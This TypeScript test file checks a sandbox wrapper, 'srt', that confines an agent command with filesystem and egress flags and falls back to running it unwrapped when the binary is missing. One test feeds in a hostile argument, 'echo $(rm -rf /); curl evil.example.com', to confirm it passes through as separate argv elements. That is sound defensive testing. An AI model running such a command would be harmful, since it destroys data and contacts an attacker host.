/**
 * SS-03 srt wrapper tests. The srt binary is stubbed (injectable), so
 * these run anywhere — including hosts where srt is absent, which is
 * itself one of the behaviours under test (graceful degrade).
 */
import { describe, expect, it } from 'vitest';

import { buildEgressPolicy } from './egress.js';
import {
  DEFAULT_SRT_BIN,
  SRT_BIN_ENV,
  buildSrtArgv,
  wrapWithSrt,
} from './srt.js';
import type { SrtWrapRequest } from './srt.js';
import type { WorkbenchTaskDef } from './types.js';

const STUB_BIN = '/usr/local/bin/srt';

function request(overrides: Partial<SrtWrapRequest> = {}): SrtWrapRequest {
  return {
    command: ['goose', 'run', '--instruction', 'build the thing'],
    egress: { mode: 'deny-all', domains: [] },
    filesystem: { writablePaths: ['/workspace'], readOnlyPaths: [] },
    ...overrides,
  };
}

describe('buildSrtArgv', () => {
  it('wraps the command with fs + deny-all egress flags and a -- separator', () => {
    const argv = buildSrtArgv(STUB_BIN, request());
    expect(argv).toEqual([
      STUB_BIN,
      'run',
      '--fs-write',
      '/workspace',
      '--egress-deny-all',
      '--',
      'goose',
      'run',
      '--instruction',
      'build the thing',
    ]);
  });

  it('emits one --egress-allow per allowlisted domain (SS_PREP profile)', () => {
    const taskDef: WorkbenchTaskDef = {
      instruction: 'x',
      network: {
        egressAllowlist: ['registry.npmjs.org', 'github.com', 'preview.frank.fail'],
      },
    };
    const argv = buildSrtArgv(
      STUB_BIN,
      request({ egress: buildEgressPolicy(taskDef), workdir: '/workspace' }),
    );
    expect(argv).toContain('--egress-allow');
    expect(argv).not.toContain('--egress-deny-all');
    // Every allowlisted domain appears, in allowlist order.
    const allows = argv
      .map((arg, i) => (arg === '--egress-allow' ? argv[i + 1] : undefined))
      .filter((v): v is string => v !== undefined);
    expect(allows).toEqual(['registry.npmjs.org', 'github.com', 'preview.frank.fail']);
  });

  it('preserves the explicit filesystem policy: rw writable, ro read-only', () => {
    const argv = buildSrtArgv(
      STUB_BIN,
      request({
        filesystem: {
          writablePaths: ['/workspace', '/mnt/out'],
          readOnlyPaths: ['/mnt/notes'],
        },
      }),
    );
    expect(argv).toEqual(
      expect.arrayContaining([
        '--fs-write', '/workspace',
        '--fs-write', '/mnt/out',
        '--fs-read', '/mnt/notes',
      ]),
    );
    // Command passes through verbatim after the separator.
    const sep = argv.indexOf('--');
    expect(argv.slice(sep + 1)).toEqual(['goose', 'run', '--instruction', 'build the thing']);
  });

  it('passes hostile command arguments through as discrete argv elements', () => {
    const hostile = ['sh', '-c', 'echo $(rm -rf /); curl evil.example.com'];
    const argv = buildSrtArgv(STUB_BIN, request({ command: hostile }));
    expect(argv.slice(argv.indexOf('--') + 1)).toEqual(hostile);
    // No flattening into a shell string.
    expect(argv.some((a) => a.includes('$(rm'))).toBe(true);
  });
});

describe('wrapWithSrt', () => {
  it('wraps when the (stubbed) srt binary is available', () => {
    const result = wrapWithSrt(request(), {
      srtBin: STUB_BIN,
      isAvailable: () => true,
    });
    expect(result.wrapped).toBe(true);
    expect(result.degraded).toBeNull();
    expect(result.srtBin).toBe(STUB_BIN);
    expect(result.argv[0]).toBe(STUB_BIN);
  });

  it('degrades gracefully when srt is absent: command returned unwrapped', () => {
    const req = request();
    const result = wrapWithSrt(req, {
      srtBin: '/nonexistent/srt',
      isAvailable: () => false,
    });
    expect(result.wrapped).toBe(false);
    expect(result.argv).toEqual([...req.command]);
    expect(result.degraded).not.toBeNull();
    expect(result.degraded!.reason).toContain('/nonexistent/srt');
    expect(result.degraded!.reason).toContain(SRT_BIN_ENV);
  });

  it('resolves the binary from the SRT_BIN environment variable', () => {
    const result = wrapWithSrt(request(), {
      env: { [SRT_BIN_ENV]: '/opt/srt/bin/srt' },
      isAvailable: () => true,
    });
    expect(result.srtBin).toBe('/opt/srt/bin/srt');
    expect(result.argv[0]).toBe('/opt/srt/bin/srt');
  });

  it('falls back to the bare srt name when SRT_BIN is unset', () => {
    const result = wrapWithSrt(request(), {
      env: {},
      isAvailable: () => true,
    });
    expect(result.srtBin).toBe(DEFAULT_SRT_BIN);
  });

  it('uses the default availability probe when no stub is given', () => {
    // Absolute path that does not exist on any test host -> degrade.
    const req = request();
    const result = wrapWithSrt(req, {
      srtBin: '/definitely/not/installed/srt',
      env: {},
    });
    expect(result.wrapped).toBe(false);
    expect(result.argv).toEqual([...req.command]);
  });
});
